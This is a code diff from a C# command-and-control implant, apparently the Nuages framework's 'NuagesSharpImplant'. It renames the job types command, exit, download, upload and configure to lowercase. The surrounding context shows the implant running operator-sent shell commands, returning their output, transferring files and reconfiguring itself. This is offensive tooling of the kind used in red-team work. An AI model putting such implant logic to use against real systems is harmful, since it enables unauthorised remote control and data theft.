@@ -193,15 +193,15 @@ namespace NuagesSharpImplant
 
             this.supportedPayloads = new string[5];
 
-            this.supportedPayloads[0] = "Command";
+            this.supportedPayloads[0] = "command";
 
-            this.supportedPayloads[1] = "Exit";
+            this.supportedPayloads[1] = "exit";
 
-            this.supportedPayloads[2] = "Download";
+            this.supportedPayloads[2] = "download";
 
-            this.supportedPayloads[3] = "Upload";
+            this.supportedPayloads[3] = "upload";
 
-            this.supportedPayloads[4] = "Configure";
+            this.supportedPayloads[4] = "configure";
 
             this.handler = connector.getHandler();
 
@@ -239,7 +239,7 @@ namespace NuagesSharpImplant
             try
             {
                 string jobType = job.SelectToken("payload.type").ToString();
-                if (jobType == "Command")
+                if (jobType == "command")
                 {
                     string cmd = job.SelectToken("payload.options.cmd").ToString();
                     string path = ".";
@@ -275,7 +275,7 @@ namespace NuagesSharpImplant
                     }
                     this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, result.Length - (n * maxrequestsize)), moreData: false, error: hasError, n: n);
                 }
-                else if (jobType == "Configure")
+                else if (jobType == "configure")
                 {
                     JObject config = (JObject)job.SelectToken("payload.options.config");
                     foreach (var x in config)
@@ -284,12 +284,12 @@ namespace NuagesSharpImplant
                     }
                     SubmitJobResult(jobId: jobId, result: Newtonsoft.Json.JsonConvert.SerializeObject(this.config), moreData: false, error: false);
                 }
-                else if (jobType == "Exit")
+                else if (jobType == "exit")
                 {
                     SubmitJobResult(jobId: jobId, result: "Bye bye!", moreData: false, error: false);
                     System.Environment.Exit(0);
                 }
-                else if (jobType == "Download")
+                else if (jobType == "download")
                 {
                     string path = ".";
                     try
@@ -315,7 +315,7 @@ namespace NuagesSharpImplant
                         SubmitJobResult(jobId: jobId, result: fs.Name, moreData: false, error: false);
                     }
                 }
-                else if (jobType == "Upload")
+                else if (jobType == "upload")
                 {
                     string path = ".";
                     try
